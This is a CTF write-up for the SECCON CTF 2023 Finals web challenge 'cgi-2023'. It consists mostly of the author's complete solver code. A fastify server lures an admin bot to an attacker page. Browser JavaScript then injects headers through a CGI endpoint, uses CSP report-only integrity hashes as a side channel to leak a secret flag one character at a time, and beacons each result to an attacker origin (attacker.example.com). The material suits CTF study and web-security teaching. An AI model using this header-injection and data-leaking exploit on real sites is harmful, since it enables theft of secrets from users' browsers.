---
title: "Cgi 2023 - SECCON CTF 2023 Finals"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "csp-bypass", "base64", "csp", "web", "seccon-ctf-2023-finals"]
summary: "CGI is one of the lost technologies."
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_SECCON_CTF_2023_Finals/web/cgi-2023"
license: "none stated"
ctf:
  name: "SECCON CTF 2023 Finals"
  year: 2023
  challenge: "Cgi 2023"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_SECCON_CTF_2023_Finals/web/cgi-2023>
- **CTF:** SECCON CTF 2023 Finals

---

# [web] cgi-2023

## Description

CGI is one of the lost technologies.

- Challenge: `http://cgi-2023.{int,dom}.seccon.games:3000`
- Admin bot: `http://cgi-2023.{int,dom}.seccon.games:1337`

## Attachments

- [cgi-2023](files/cgi-2023)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:
```
docker run -it --rm \
    -e WEB_BASE_URL=http://localhost:3000 \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e ATTACKER_BASE_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solver)
```

where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_SECCON_CTF_2023_Finals/web/cgi-2023/solver/index.js>

```javascript
const fastify = require("fastify")();
const path = require("node:path");

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? fail("No BOT_BASE_URL");
const ATTACKER_BASE_URL =
  process.env.ATTACKER_BASE_URL ?? fail("No ATTACKER_BASE_URL");
const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const start = async () => {
  fastify.addContentTypeParser(
    "application/csp-report",
    { parseAs: "string" },
    fastify.getDefaultJsonParser()
  );

  fastify.register(require("@fastify/static"), {
    root: path.join(__dirname, "public"),
  });

  const reportedPrefixes = [];

  fastify.post("/csp-report", async (req, reply) => {
    const url = new URL(req.body["csp-report"]["document-uri"]);
    reportedPrefixes.push(url.searchParams.get("prefix"));
    return "";
  });

  fastify.get("/reported-prefixes", async (req, reply) => {
    const targetLen = parseInt(req.query.len);
    while (true) {
      if (reportedPrefixes.length >= targetLen) {
        reply.send(reportedPrefixes);
        reportedPrefixes.length = 0;
        return reply;
      }
      await sleep(10);
    }
  });

  fastify.post("/leaked", async (req, reply) => {
    // debug
    console.log(req.body);
    return "";
  });

  fastify.post("/flag", async (req, reply) => {
    // You got a flag!
    console.log("Flag:", req.body);
    process.exit(0);
  });

  fastify.listen({ port: PORT, host: "0.0.0.0" }, async (err, address) => {
    if (err) fail(err.toString());

    await sleep(3 * 1000);
    await reportUrl(
      `${ATTACKER_BASE_URL}?${new URLSearchParams({
        baseUrl: "http://web:3000",
      })}`
    );

    fail("Failed");
  });
};
start();
```


## Solver: `main.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_SECCON_CTF_2023_Finals/web/cgi-2023/solver/public/main.js>

```javascript
const BASE_URL = new URLSearchParams(location.search).get("baseUrl");
const CHARS = "}_abcdefghijklmnopqrstuvwxyz";

const sleep = async (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const calcIntegrity = (data) =>
  "sha256-" + CryptoJS.enc.Base64.stringify(CryptoJS.SHA256(data));

const leak = async (known) => {
  const ws = [];
  const prefixes = [];

  for (const c of CHARS) {
    const prefix = known + c;
    prefixes.push(prefix);

    const body = `
<style>Status: 200 OK
Content-Type: text/plain; charset=utf-8

${prefix}`.trimStart();
    const integrity = calcIntegrity(body.replace("<style>", ""));
    const contentLength = body.replaceAll("\n", "\r\n").length;

    const q = `
Content-Type: text/html
Content-Length: ${contentLength}
Content-Security-Policy-Report-Only: style-src '${integrity}'; report-uri ${location.origin}/csp-report

<style>`.trimStart();

    const url = `${BASE_URL}?${new URLSearchParams({ q, prefix })}`;
    ws.push(open(url));
  }

  const reportedPrefixes = new Set(
    await fetch(
      `${location.origin}/reported-prefixes?len=${CHARS.length - 1}`
    ).then((r) => r.json())
  );

  for (const w of ws) {
    w.close();
  }
  for (const prefix of prefixes) {
    if (!reportedPrefixes.has(prefix)) {
      return prefix;
    }
  }
  throw "Not found";
};

const main = async () => {
  let known = "SECCON{";
  while (!known.endsWith("}")) {
    known = await leak(known);
    navigator.sendBeacon(`${location.origin}/leaked`, known);
  }
  navigator.sendBeacon(`${location.origin}/flag`, known);
};
main();
```
